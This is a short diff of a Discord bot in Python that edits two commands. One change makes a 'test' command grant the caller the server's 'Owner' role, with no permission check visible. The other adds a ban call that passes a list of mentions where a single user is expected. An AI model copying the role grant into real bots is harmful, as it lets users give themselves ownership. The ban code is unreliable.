@@ -341,7 +341,7 @@ async def test(ctx):
 ##    x= await client.wait_for("message",timeout=60.0, check=room)
 ##    await ctx.send(x.content)
         for i in ctx.guild.roles:
-            if( i.name=="Moderator"):
+            if( i.name=="Owner"):
                 x=i
         await ctx.author.add_roles(x)
         await ctx.send("ok")
@@ -369,7 +369,9 @@ async def avatar(ctx):
 @commands.check(basic_check)
 async def ban(ctx):
     x= "BeGONe THOT!!!!"
+    await ctx.guild.ban(ctx.message.mentions)
     await ctx.send(x)
+    
 
 @client.command()
 @commands.check(basic_check)
